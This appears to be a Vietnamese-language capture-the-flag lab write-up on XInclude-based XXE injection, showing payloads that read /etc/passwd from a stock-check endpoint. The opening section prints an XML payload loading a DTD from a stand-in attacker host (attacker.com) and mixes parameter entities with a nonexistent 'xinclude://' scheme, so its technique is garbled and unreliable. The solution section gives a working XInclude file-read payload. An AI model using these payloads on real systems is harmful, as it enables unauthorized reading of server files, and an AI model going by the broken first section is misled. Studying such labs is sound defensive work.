# Exploiting XInclude để lấy tệp tin

Kỹ thuật XInclude có thể được khai thác để lấy các tệp tin từ máy chủ bằng cách chèn chúng vào tài liệu XML và sử dụng XInclude để đọc và trả về nội dung của chúng. Để thực hiện cuộc tấn công này, bạn cần biết đường dẫn đến tệp tin mục tiêu trên máy chủ. Dưới đây là một ví dụ về cách khai thác XInclude để lấy tệp tin:

1. Định nghĩa một đối tượng XML parameter entity để chứa đường dẫn đến tệp tin mục tiêu:

```xml
<!ENTITY % xinclude SYSTEM "file:///etc/passwd">
```

Trong ví dụ này, tôi sử dụng đường dẫn đến tệp tin `"/etc/passwd"` làm tệp tin mục tiêu.

2. Định nghĩa một đối tượng XML parameter entity khác để chứa khai báo XInclude:
```xml
<!ENTITY % xinclude-exp "<!ENTITY &#x25; exfil SYSTEM 'xinclude:///%xinclude;'>">
```

Đối tượng XML parameter entity này chứa khai báo XInclude với một đối tượng XML parameter entity bên trong có tên `"exfil"`.

3. Kết hợp các đối tượng XML parameter entity đã định nghĩa để tạo thành một tài liệu XML hoàn chỉnh:

```xml
<!DOCTYPE test [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
%xinclude-exp;
]>
<root>&exfil;</root>
```

Trong ví dụ này, tài liệu XML chứa một phần tử root và giá trị của nó là đối tượng XML parameter entity `"exfil"`.

4. Đặt tài liệu XML vào yêu cầu gửi đến ứng dụng mục tiêu và chờ nhận kết quả.

Khi ứng dụng mục tiêu xử lý yêu cầu, nó sẽ đọc tệp tin được chỉ định và trả về nội dung của tệp tin đó trong phản hồi. Bạn có thể lấy nội dung của tệp tin và sử dụng nó cho mục đích của mình.

# Overview:

Form của challenge

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/8d126bbe-c3cf-4495-a551-d7de5d15a9ea)

Theo mô ta của đề ta biết: Đầu vào của người dùng được bao gồm trong tài liệu XML trên máy chủ, nhưng không kiểm soát tài liệu XML đầy đủ. Goal là lấy được `etc/passwd`.

Đầu tiên ta check stock, và ta không thấy form XML

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/ffc8a329-f44e-4574-ab5f-7c6f2e50dc97)

Một form XML thường như thế nào 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck> 
```

Nếu tôi thêm một số XML vào một trong các trường, nó có thể kết thúc bên trong XML. Ví dụ: add <tag>content</tag> có thể dẫn đến XML như thế này:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1<tag>content</tag></productId>
  <storeId>1</storeId>
</stockCheck> 
```

# Solution:

Khai thác XInclude để lấy tệp tin, tôi tạo một thẻ mới chứa namespace XInclude và cung cấp đường dẫn tới tệp tin cần được bao gồm:

```xml
<xxx xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></xxx>
```

Tương tự như trong các bài lab trước, nếu `productId` không hợp lệ, nó sẽ được trả lại. Vì vậy, tôi thêm nội dung này vào `productId` trong yêu cầu để gây ra lỗi và có nội dung của `productId` trả về cho mình.

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/d2949edf-23be-4690-9c1c-d90e944ca557)

